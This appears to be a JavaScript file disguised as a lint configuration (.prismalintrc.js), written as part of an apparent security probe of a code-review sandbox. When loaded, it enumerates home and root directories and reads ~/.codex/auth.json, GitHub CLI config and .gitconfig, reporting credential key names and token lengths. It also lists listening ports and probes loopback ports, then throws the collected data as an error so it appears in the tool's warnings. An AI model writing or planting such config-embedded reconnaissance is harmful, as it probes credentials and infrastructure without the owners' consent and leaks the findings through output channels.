// H122 run 2, arm D — follow-up credential/file-surface characterisation.
// Follows arm A's positive (readable ~/.config/gh/hosts.yml with a 764-char oauth_token).
// Names, sizes, modes, key names and value LENGTHS only. No secret value is printed,
// stored or used. Throws so the text lands in operational_warnings.
const fs = require('fs');
const os = require('os');
const path = require('path');
const { spawnSync } = require('child_process');

const H = os.homedir();
const C = process.cwd();
const p = [];

const st = (f) => {
  try {
    const s = fs.statSync(f);
    return 'ok:' + s.size + 'b:m' + (s.mode & 0o777).toString(8);
  } catch (e) {
    return 'E:' + (e.code || 'ERR');
  }
};
const ls = (d, n) => {
  try {
    return fs
      .readdirSync(d)
      .slice(0, n)
      .map((x) => {
        try {
          return fs.statSync(path.join(d, x)).isDirectory() ? x + '/' : x;
        } catch (e) {
          return x + '?';
        }
      })
      .join(',');
  } catch (e) {
    return 'E:' + (e.code || 'ERR');
  }
};
const tree = (d, dep) => {
  if (dep === 0) return '';
  try {
    return fs
      .readdirSync(d)
      .slice(0, 25)
      .map((x) => {
        const f = path.join(d, x);
        let isd = false;
        try {
          isd = fs.statSync(f).isDirectory();
        } catch (e) {}
        return isd ? x + '/[' + tree(f, dep - 1) + ']' : x + ':' + st(f).replace('ok:', '');
      })
      .join(',');
  } catch (e) {
    return 'E:' + (e.code || 'ERR');
  }
};

p.push('home_len=' + String(H).length + ':tail=' + path.basename(String(H) || '?'));
p.push('cwd_len=' + String(C).length + ':tail=' + path.basename(String(C) || '?'));
p.push('rootls=[' + ls('/', 25) + ']');
p.push('cfg_at_root=' + fs.existsSync('/.prismalintrc.js') + ':cfg_at_cwd=' + fs.existsSync(path.join(C, '.prismalintrc.js')));
p.push('codex=[' + tree(path.join(H, '.codex'), 2) + ']');
p.push('snapshot=[' + tree(path.join(H, '.coderabbit-snapshot'), 1) + ']');
p.push('local=[' + tree(path.join(H, '.local'), 2) + ']');
p.push('cache=[' + ls(path.join(H, '.cache'), 15) + ']');
p.push('gitdir=[' + ls(path.join(H, 'git'), 10) + ']');
p.push('npmdir=[' + ls(path.join(H, '.npm'), 10) + ']');

try {
  const lines = fs.readFileSync(path.join(H, '.gitconfig'), 'utf8').split('\n');
  p.push('gitcfg_sections=' + lines.filter((l) => /^\s*\[/.test(l)).map((l) => l.trim()).slice(0, 8).join(';'));
  p.push(
    'gitcfg_extra=' +
      lines
        .filter((l) => /extraheader/i.test(l))
        .map((l) => {
          const i = l.indexOf(':');
          const pre = i === -1 ? l.replace(/\s+/g, ' ').trim() : l.slice(0, i).replace(/\s+/g, ' ').trim();
          return 'pre(' + pre + ')len=' + (i === -1 ? 0 : l.slice(i + 1).trim().length);
        })
        .join(';')
  );
  p.push(
    'gitcfg_helpers=' +
      lines.filter((l) => /helper|askpass|credential/i.test(l)).map((l) => l.split(/[=:]/)[0].replace(/\s+/g, '').trim()).slice(0, 8).join(',')
  );
} catch (e) {
  p.push('gitcfg=E:' + (e.code || 'ERR'));
}

try {
  const g = path.join(H, '.config', 'gh', 'config.yml');
  const t = fs.readFileSync(g, 'utf8');
  p.push(
    'ghcfg=' + t.length + 'b:keys=' + t.split('\n').filter((l) => /^\S+:\s*$/.test(l)).map((l) => l.trim()).slice(0, 8).join(',')
  );
} catch (e) {
  p.push('ghcfg=E:' + (e.code || 'ERR'));
}

const af = path.join(H, '.codex', 'auth.json');
try {
  const j = JSON.parse(fs.readFileSync(af, 'utf8'));
  p.push('authkeys=' + Object.keys(j).slice(0, 10).join(','));
  if (j.tokens && typeof j.tokens === 'object') {
    p.push('authtokens=' + Object.keys(j.tokens).slice(0, 10).map((k) => k + ':' + String(j.tokens[k] || '').length).join(','));
  }
  if (typeof j.OPENAI_API_KEY === 'string') p.push('apikeylen=' + j.OPENAI_API_KEY.length);
} catch (e) {
  p.push('auth.json=' + (e.code || e.name || 'ERR'));
}

try {
  const t = fs.readFileSync('/proc/net/tcp', 'utf8').split('\n').slice(1).filter(Boolean);
  const lis = t
    .map((l) => l.trim().split(/\s+/))
    .filter((f) => f[3] === '0A')
    .map((f) => f[1]);
  p.push('listen=' + lis.slice(0, 10).join(','));
} catch (e) {
  p.push('listen=E');
}

const child = [
  "const net=require('net');const out=[];",
  "['1080','9'].forEach(function(pp){var s=net.connect({host:'127.0.0.1',port:+pp,timeout:1500});",
  "s.on('connect',function(){out.push('p'+pp+'=CONN');s.destroy();});",
  "s.on('error',function(e){out.push('p'+pp+'=E:'+(e.code||'ERR'));});",
  "s.on('timeout',function(){out.push('p'+pp+'=TIMEOUT');s.destroy();});});",
  "setTimeout(function(){console.log(out.join(','));process.exit(0);},3000);",
].join('');
try {
  const r = spawnSync(process.execPath, ['-e', child], { timeout: 8000, encoding: 'utf8' });
  p.push('loopback=[' + ((r.stdout || '') + (r.stderr || '')).replace(/\s+/g, ';').slice(0, 160) + ']');
} catch (e) {
  p.push('loopback=SPAWNERR');
}

throw new Error('H122D-PRISMA ' + p.join(' | '));
